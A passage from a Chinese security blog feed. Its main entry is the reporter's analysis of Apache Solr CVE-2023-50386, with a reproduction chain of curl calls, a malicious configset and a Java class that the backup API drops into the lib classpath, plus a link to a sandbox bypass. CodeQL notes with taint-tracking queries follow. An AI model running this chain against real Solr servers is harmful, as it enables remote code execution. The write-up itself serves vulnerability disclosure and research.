(org.apache.jena.sparql.engine.iterator)</span><br><span class="line">hasNext:116, QueryIteratorBase (org.apache.jena.sparql.engine.iterator)</span><br><span class="line">hasNextBinding:38, QueryIteratorWrapper (org.apache.jena.sparql.engine.iterator)</span><br><span class="line">nextBinding:154, QueryIteratorBase (org.apache.jena.sparql.engine.iterator)</span><br><span class="line">next:134, QueryIteratorBase (org.apache.jena.sparql.engine.iterator)</span><br><span class="line">next:43, QueryIteratorBase (org.apache.jena.sparql.engine.iterator)</span><br><span class="line">next:53, RowSetStream (org.apache.jena.sparql.exec)</span><br><span class="line">next:29, RowSetStream (org.apache.jena.sparql.exec)</span><br><span class="line">nextBinding:93, ResultSetStream (org.apache.jena.sparql.engine)</span><br><span class="line">nextSolution:118, ResultSetStream (org.apache.jena.sparql.engine)</span><br><span class="line">next:126, ResultSetStream (org.apache.jena.sparql.engine)</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.ruanyifeng.com/blog/2020/02/sparql.html">RDF 和 SPARQL 初探：以维基数据为例 - 阮一峰的网络日志</a></p>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
        <tag>CodeQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Solr Backup/Restore APIs RCE (CVE-2023-50386)分析及挖掘思路</title>
    <url>/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<p>Apache Solr在创建Collection时会以一个特定的目录作为classpath，从中加载一些类，而Collection的备份功能可以导出攻击者上传的恶意class文件到该目录，从而让Solr加载自定义class，造成任意Java代码执行，可以进一步绕过Solr配置的Java沙箱，最终造成任意命令执行。</p>
<span id="more"></span>

<p>这个漏洞其实我在22年8月就报告给了Solr官方，在SolrCloud模式的默认配置下可以造成任意命令执行，但官方经过半年的讨论，在23年2月回复我说只做修复，但不分配CVE编号，漏洞跟踪为<a href="https://issues.apache.org/jira/browse/SOLR-16480">SOLR-16480</a>。然后这篇分析笔记写于23年3月，我也一直未公开。</p>
<p>不过今天（24年2月10日）无意间看到Solr官方发布了<a href="https://solr.apache.org/security.html#cve-2023-50386-apache-solr-backuprestore-apis-allow-for-deployment-of-executables-in-malicious-configsets">CVE-2023-50386</a>的漏洞通告，然后漏洞描述和我提交的一模一样，点进去一看漏洞发现者果然是自己的ID，我也没搞明白这是什么操作，不过既然官方已经发布通告，我也就公开漏洞分析笔记了。</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
<li>Apache Solr 6.0.0 through 8.11.2</li>
<li>Apache Solr 9.0.0 before 9.4.1</li>
<li>SolrCloud模式</li>
</ul>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --<span class="built_in">rm</span> -ti --name solr9.0.0 -p 8983:8983 -p 5005:5005  solr:9.0.0 bash</span><br><span class="line"><span class="comment"># 启动并进入solr容器</span></span><br><span class="line">solr start -c -a <span class="string">&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005&quot;</span></span><br><span class="line"><span class="comment"># 以SolrCloud模式启动Solr，并附加Java调试参数</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20240210195410647.png" alt="image-20240210195410647"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="准备Solr默认配置文件"><a href="#准备Solr默认配置文件" class="headerlink" title="准备Solr默认配置文件"></a>准备Solr默认配置文件</h3><p>先以root权限进入Solr容器，打包默认的配置文件并复制出来，当然也可以从Solr源码中获得：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -ti -uroot solr9.0.0 bash</span><br><span class="line"><span class="built_in">cd</span> /opt/solr-9.0.0/server/solr/configsets/_default</span><br><span class="line">tar cf conf.tar conf/</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">docker <span class="built_in">cp</span> solr9.0.0:/opt/solr-9.0.0/server/solr/configsets/_default/conf.tar ~/Desktop/test/</span><br><span class="line">tar xf conf.tar</span><br></pre></td></tr></table></figure>

<p><img src="/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20230326154945577.png" alt="image-20230326154945577"></p>
<h3 id="编译恶意class"><a href="#编译恶意class" class="headerlink" title="编译恶意class"></a>编译恶意class</h3><p>编译一个包名为<code>zk_backup_0.configs.conf1</code>的Java类（容器内的Java版本为17，注意版本兼容问题）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> zk_backup_0.configs.conf1;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/tmp/success&quot;</span>).createNewFile();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="上传配置文件conf1"><a href="#上传配置文件conf1" class="headerlink" title="上传配置文件conf1"></a>上传配置文件<code>conf1</code></h3><p>将恶意class放入配置文件目录中，并打包上传到Solr，命名为<code>conf1</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> zk_backup_0/configs/conf1/Exp.class conf/</span><br><span class="line"><span class="built_in">cd</span> conf</span><br><span class="line">zip -q -r conf1.zip *</span><br><span class="line">curl -X POST --header <span class="string">&quot;Content-Type:application/octet-stream&quot;</span> --data-binary @conf1.zip <span class="string">&quot;http://127.0.0.1:8983/solr/admin/configs?action=UPLOAD&amp;name=conf1&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20230326155727611.png" alt="image-20230326155727611"></p>
<h3 id="用conf1创建collection1"><a href="#用conf1创建collection1" class="headerlink" title="用conf1创建collection1"></a>用<code>conf1</code>创建<code>collection1</code></h3><p>用上一步上传的配置<code>conf1</code>去创建一个Collection，名为<code>collection1</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&quot;http://127.0.0.1:8983/solr/admin/collections?action=CREATE&amp;name=collection1&amp;numShards=1&amp;replicationFactor=1&amp;wt=json&amp;collection.configName=conf1&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20230326155958649.png" alt="image-20230326155958649"></p>
<h3 id="备份collection1，导出conf1"><a href="#备份collection1，导出conf1" class="headerlink" title="备份collection1，导出conf1"></a>备份<code>collection1</code>，导出<code>conf1</code></h3><p>通过备份功能可以将<code>collection1</code>导出，其中包括创建<code>collection1</code>时用的配置文件，也就是<code>conf1</code>，从而恶意class也随之导出。</p>
<p>以下API中<code>location</code>为要导出的路径，<code>/var/solr/data/</code>是<code>SOLR_HOME</code>的路径。<code>name</code>为导出的名字，其实也就相当于路径的一部分</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&quot;http://127.0.0.1:8983/solr/admin/collections?action=BACKUP&amp;collection=collection1&amp;location=/var/solr/data/&amp;name=collection2_shard1_replica_n1&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20230326160336660.png" alt="image-20230326160336660"></p>
<p>响应完成后，<code>collection1</code>被导出到了<code>/var/solr/data/collection2_shard1_replica_n1</code></p>
<p><img src="/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20230326160427808.png" alt="image-20230326160427808"></p>
<p>而它对应的配置被导出到了<code>/var/solr/data/collection2_shard1_replica_n1/collection1/zk_backup_0/configs/</code></p>
<p><img src="/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20230326160514997.png" alt="image-20230326160514997"></p>
<p>通过备份的接口再次导出<code>collection1</code>，注意<code>location</code>和<code>name</code>都有变化：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&quot;http://127.0.0.1:8983/solr/admin/collections?action=BACKUP&amp;collection=collection1&amp;location=/var/solr/data/collection2_shard1_replica_n1&amp;name=lib&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20230326160725963.png" alt="image-20230326160725963"></p>
<p>这次导出后，会发现我们的class最终在<code>/var/solr/data/collection2_shard1_replica_n1/lib/collection1/zk_backup_0/configs/conf1</code></p>
<p><img src="/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20230326160746180.png" alt="image-20230326160746180"></p>
<p>目录结构<code>zk_backup_0/configs/conf1</code>与包名<code>zk_backup_0.configs.conf1</code>恰好对应</p>
<h3 id="上传配置文件conf2"><a href="#上传配置文件conf2" class="headerlink" title="上传配置文件conf2"></a>上传配置文件<code>conf2</code></h3><p>默认配置的<code>solrconfig.xml</code>文件有个<code>valueSourceParser</code>标签</p>
<p><img src="/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20230326161106492.png" alt="image-20230326161106492"></p>
<p>取消其注释，并修改为</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">valueSourceParser</span> <span class="attr">name</span>=<span class="string">&quot;myfunc&quot;</span> <span class="attr">class</span>=<span class="string">&quot;zk_backup_0.configs.conf1.Exp&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20230326161325424.png" alt="image-20230326161325424"></p>
<p>打包上传，命名为<code>conf2</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> Exp.class conf1.zip</span><br><span class="line">zip -q -r conf2.zip *</span><br><span class="line">curl -X POST --header <span class="string">&quot;Content-Type:application/octet-stream&quot;</span> --data-binary @conf2.zip <span class="string">&quot;http://127.0.0.1:8983/solr/admin/configs?action=UPLOAD&amp;name=conf2&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20230326161557621.png" alt="image-20230326161557621"></p>
<h3 id="用conf2创建collection2"><a href="#用conf2创建collection2" class="headerlink" title="用conf2创建collection2"></a>用<code>conf2</code>创建<code>collection2</code></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&quot;http://127.0.0.1:8983/solr/admin/collections?action=CREATE&amp;name=collection2&amp;numShards=1&amp;replicationFactor=1&amp;wt=json&amp;collection.configName=conf2&quot;</span></span><br></pre></td></tr></table></figure>

<p>Collection创建过程中会将<code>SOLR_HOME/collection2_shard1_replica_n1/lib/</code>下的jar包或者一级子目录作为URLClassLoader的urls。并且会加载<code>solrconfig.xml</code>中配置的类，从而导致<code>zk_backup_0.configs.conf1.Exp</code>类的静态代码被执行</p>
<p><img src="/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20230326162216577.png" alt="image-20230326162216577"></p>
<p><img src="/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20230326162237481.png" alt="image-20230326162237481"></p>
<h3 id="绕过沙箱"><a href="#绕过沙箱" class="headerlink" title="绕过沙箱"></a>绕过沙箱</h3><p>其实在Solr中通过这种方式执行Java代码是会受沙箱限制的，这也是为什么我用了<code>new File(&quot;/tmp/success&quot;).createNewFile();</code>创建文件来演示漏洞而非命令执行。</p>
<p>绕过也比较容易，参考：<a href="https://www.mi1k7ea.com/2020/05/03/%E6%B5%85%E6%9E%90Java%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#%E5%88%9B%E5%BB%BAClassLoader%E7%BB%95%E8%BF%87">https://www.mi1k7ea.com/2020/05/03/%E6%B5%85%E6%9E%90Java%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#%E5%88%9B%E5%BB%BAClassLoader%E7%BB%95%E8%BF%87</a></p>
<h3 id="删除创建的配置和Collection"><a href="#删除创建的配置和Collection" class="headerlink" title="删除创建的配置和Collection"></a>删除创建的配置和Collection</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&quot;http://127.0.0.1:8983/solr/admin/collections?action=DELETE&amp;name=collection1&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:8983/solr/admin/configs?action=DELETE&amp;name=conf1&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:8983/solr/admin/configs?action=DELETE&amp;name=conf2&quot;</span></span><br></pre></td></tr></table></figure>





<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞复现过程尽管很复杂，但漏洞关键其实就几点</p>
<ul>
<li>Solr在创建Collection时会加载配置文件中设置的Java类，而classpath是一个特定的目录</li>
<li>备份Collection时会导出一系列配置文件，而这些文件由用户上传</li>
<li>备份导出的路径在一定程度上可控</li>
<li>所用到的api接口默认情况下均可未授权访问</li>
</ul>
<h3 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h3><p>挖掘Solr前，我的目的很明确，只关注RCE漏洞，然后去大概了解了一下Solr的用途和历史漏洞。有一篇Solr的总结很全面：<a href="https://paper.seebug.org/1515/">https://paper.seebug.org/1515/</a></p>
<p>分析完历史漏洞后，感觉Solr最大的问题是默认情况下很多敏感的接口都是未授权可访问，我觉得这也是挖掘新洞的一个着手点。</p>
<p>其中关于配置集，和Collection管理的api尤其受关注。因为创建Collection时可以指定某个配置，而这些配置又由用户上传，配置中某些配置项又必然影响某些代码逻辑。</p>
<p><a href="https://solr.apache.org/guide/solr/9_0/configuration-guide/configsets-api.html">https://solr.apache.org/guide/solr/9_0/configuration-guide/configsets-api.html</a></p>
<p><a href="https://solr.apache.org/guide/solr/9_0/deployment-guide/collection-management.html">https://solr.apache.org/guide/solr/9_0/deployment-guide/collection-management.html</a></p>
<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><h4 id="加载lib"><a href="#加载lib" class="headerlink" title="加载lib"></a>加载lib</h4><p>在org.apache.solr.handler.admin.CollectionsHandler#handleRequestBody打断点，然后发起如下请求</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&quot;http://127.0.0.1:8983/solr/admin/collections?action=CREATE&amp;name=test_collection&amp;numShards=1&amp;replicationFactor=1&amp;wt=json&amp;collection.configName=_default&quot;</span></span><br></pre></td></tr></table></figure>

<p>这里就是Collection相关请求的入口</p>
<p><img src="/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20230326192056416.png" alt="image-20230326192056416"></p>
<p>然后到 org.apache.solr.core.SolrConfig#initLibs</p>
<p><img src="/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20230326192404098.png" alt="image-20230326192404098"></p>
<p>这里的<code>libPath</code>即<code>/var/solr/data/test_collection_shard1_replica_n1/lib</code>，此路径如果存在的话，就会用这个路径下的Jar包和一级子目录作为urls创建URLClassLoader，该URLClassLoader对象储存在<code>org.apache.solr.core.SolrResourceLoader#classLoader</code>。</p>
<p>（可以手动在这个目录下创建lib，观察一下代码逻辑）：</p>
<p><img src="/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20230326202031676.png" alt="image-20230326202031676"></p>
<p><img src="/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20230326202142722.png" alt="image-20230326202142722"></p>
<p>后续读取配置文件中的类并加载的代码就不再跟了。</p>
<h4 id="写入lib"><a href="#写入lib" class="headerlink" title="写入lib"></a>写入lib</h4><p>后面的挖掘方向就是如何在<code>/var/solr/data/test_collection_shard1_replica_n1/lib</code>目录下写入所需文件，这是这个漏洞另一个关键的地方。</p>
<p>回到备份Collection的api：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/admin/collections?action=BACKUP&amp;collection=collection1&amp;location=/var/solr/data/&amp;name=dirname</span><br></pre></td></tr></table></figure>

<p>这个api调用示例的是将<code>collection1</code>导出到<code>/var/solr/data/</code>路径下的<code>dirname</code>目录，要求<code>location</code>这个目录必须提前存在，然后我们借由配置文件上传的可控的文件在更深的路径，即<code>/var/solr/data/dirname/collection1/zk_backup_0/configs/conf1/</code></p>
<p>我一开始想往<code>/var/solr/data/test_collection_shard1_replica_n1/lib/</code>写入一个Jar包，也尝试目录穿越等等方法，发现确实无法做到。只能在<code>libPath</code>的子子子子目录写入可控文件，也就是<code>/var/solr/data/test_collection_shard1_replica_n1/lib/collection1/zk_backup_0/configs/conf1/</code>，当然把Jar包写在这里是不能被识别的。</p>
<p>后来想到Java的类结构，不也是<code>包名/包名/包名/类名.class</code>，刚好抵消这里多出来的子目录，所以就有了前文复现流程中的奇怪的包名。</p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a href="https://github.com/apache/solr/commit/28d6b0163316376ef3b5429b3554c5041b47b5be">https://github.com/apache/solr/commit/28d6b0163316376ef3b5429b3554c5041b47b5be</a></p>
<p>增加了备份导出时的文件类型黑名单</p>
<p><img src="/2024/02/10/Apache-Solr-Backup-Restore-APIs-RCE-CVE-2023-50386-%E5%88%86%E6%9E%90%E5%8F%8A%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/image-20230326204855086.png" alt="image-20230326204855086"></p>
<p>（目前最新的修复方案似乎不太一样，以上均为之前的代码分析，最新的我也还没看）</p>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
        <tag>Solr</tag>
      </tags>
  </entry>
  <entry>
    <title>CodeQL学习笔记</title>
    <url>/2022/03/05/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>CodeQL学习笔记，大部分翻译自官方文档</p>
<span id="more"></span>

<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="下载CodeQL-CLI"><a href="#下载CodeQL-CLI" class="headerlink" title="下载CodeQL CLI"></a>下载CodeQL CLI</h3><p><a href="https://github.com/github/codeql-cli-binaries/releases">https://github.com/github/codeql-cli-binaries/releases</a></p>
<p>解压至<code>/xxx/CodeQL</code>目录并添加环境变量<code>export PATH=/xxx/CodeQL/codeql:$PATH</code></p>
<h3 id="下载包含标准库的工作空间"><a href="#下载包含标准库的工作空间" class="headerlink" title="下载包含标准库的工作空间"></a>下载包含标准库的工作空间</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /xxx/CodeQL/</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/github/vscode-codeql-starter.git</span><br><span class="line"><span class="built_in">cd</span> vscode-codeql-starter</span><br><span class="line">git submodule update --init --remote</span><br><span class="line">git submodule update --remote	<span class="comment">#定期执行以更新子模块</span></span><br></pre></td></tr></table></figure>

<h3 id="安装VSCode-CodeQL扩展"><a href="#安装VSCode-CodeQL扩展" class="headerlink" title="安装VSCode CodeQL扩展"></a>安装VSCode CodeQL扩展</h3><p>VSCode商店搜索安装CodeQL，并在扩展设置中设置CodeQL引擎路径<code>/xxx/CodeQL/codeql/codeql</code></p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>在VSCode 中，单击文件 &gt; 打开工作区，选择<code>vscode-codeql-starter</code>目录下的<code>vscode-codeql-starter.code-workspace</code>文件<br>在VSCode左侧选择CodeQL插件页面，选择一个CodeQL数据库，然后在文件<code>vscode-codeql-starter/codeql-custom-queries-java/example.ql</code>单击右键选择<code>CodeQL:Run Query</code></p>
<h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><h3 id="生成数据库"><a href="#生成数据库" class="headerlink" title="生成数据库"></a>生成数据库</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">codeql database create /xxx/CodeQL/databases/Test --language=<span class="string">&quot;java&quot;</span> --source-root=/xxx/Demo --<span class="built_in">command</span>=<span class="string">&quot;mvn clean package -Dmaven.test.skip=true&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>&#x2F;xxx&#x2F;CodeQL&#x2F;databases&#x2F;Test	指定生成的数据库位置<br>–source-root	项目源码路径<br>–command	编译命令，PHP和Python等不需要。对于Maven，Ant等项目也可以省略</p>
</blockquote>
<p>如果没有指定<code>--command</code>，CodeQL会根据平台的不同，调用<code>./java/tools/autobuild.cmd</code>或<code>./java/tools/autobuild.sh</code>对项目进行分析。如果该项目的编译工具为Gradle、Maven或Ant，且能找到相应的配置文件。程序就会进入相应的流程，调用相关的编译指令对项目进行编译。CodeQL会收集项目编译过程中产生的信息，并以此生成数据库。如果不属于Gradle、Maven、Ant中任意一种，则报错退出。</p>
<h2 id="CodeQL元数据"><a href="#CodeQL元数据" class="headerlink" title="CodeQL元数据"></a>CodeQL元数据</h2><p><a href="https://codeql.github.com/docs/writing-codeql-queries/metadata-for-codeql-queries/">CodeQL查询的元数据</a>作为 QLDoc 注释的内容包含在每个查询文件的顶部。此元数据告诉 LGTM 和<a href="https://codeql.github.com/docs/codeql-for-visual-studio-code/#codeql-for-visual-studio-code">VSCode 的 CodeQL 插件</a>如何处理查询并正确显示其结果。</p>
<p>例:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @name Empty block</span></span><br><span class="line"><span class="comment"> * @kind problem</span></span><br><span class="line"><span class="comment"> * @problem.severity warning</span></span><br><span class="line"><span class="comment"> * @id java/example/empty-block</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> BlockStmt b</span><br><span class="line"><span class="keyword">where</span> b.getNumStmt() <span class="operator">=</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">select</span> b, &quot;This is an empty block.&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>



<h2 id="一些示例"><a href="#一些示例" class="headerlink" title="一些示例"></a>一些示例</h2><h3 id="Java污点跟踪-GetenvSource-URLSink"><a href="#Java污点跟踪-GetenvSource-URLSink" class="headerlink" title="Java污点跟踪_GetenvSource-URLSink"></a>Java污点跟踪_GetenvSource-URLSink</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class GetenvSource extends DataFlow::ExprNode &#123;</span><br><span class="line">  GetenvSource() &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Method</span> m <span class="operator">|</span> m <span class="operator">=</span> this.asExpr().(MethodAccess).getMethod() <span class="operator">|</span></span><br><span class="line">      m.hasName(&quot;getenv&quot;) <span class="keyword">and</span></span><br><span class="line">      m.getDeclaringType() instanceof TypeSystem</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class URLSink extends DataFlow::ExprNode &#123;</span><br><span class="line">  URLSink() &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Call</span> <span class="keyword">call</span> <span class="operator">|</span></span><br><span class="line">      this.asExpr() <span class="operator">=</span> call.getArgument(<span class="number">0</span>) <span class="keyword">and</span></span><br><span class="line">      call.getCallee().(Constructor).getDeclaringType().hasQualifiedName(&quot;java.net&quot;, &quot;URL&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GetenvToURLTaintTrackingConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  GetenvToURLTaintTrackingConfig() &#123; this <span class="operator">=</span> &quot;GetenvToURLTaintTrackingConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123; source instanceof GetenvSource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123; sink instanceof URLSink &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> GetenvToURLTaintTrackingConfig cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"><span class="keyword">where</span> cfg.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> sink, source, sink, &quot;-&quot;</span><br></pre></td></tr></table></figure>



<h3 id="Python污点跟踪-RemoteFlowSource-FileSystemAccessSink"><a href="#Python污点跟踪-RemoteFlowSource-FileSystemAccessSink" class="headerlink" title="Python污点跟踪_RemoteFlowSource-FileSystemAccessSink"></a>Python污点跟踪_RemoteFlowSource-FileSystemAccessSink</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">import python</span><br><span class="line">import semmle.python.dataflow.new.DataFlow</span><br><span class="line">import semmle.python.dataflow.new.TaintTracking</span><br><span class="line">import semmle.python.dataflow.new.RemoteFlowSources</span><br><span class="line">import semmle.python.Concepts</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class RemoteToFileConfiguration extends TaintTracking::Configuration &#123;</span><br><span class="line">  RemoteToFileConfiguration() &#123; this <span class="operator">=</span> &quot;RemoteToFileConfiguration&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123; source instanceof RemoteFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    sink <span class="operator">=</span> <span class="keyword">any</span>(FileSystemAccess fa).getAPathArgument()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> RemoteToFileConfiguration cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"><span class="keyword">where</span> cfg.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> sink, source, sink, &quot;-&quot;</span><br></pre></td></tr></table></figure>





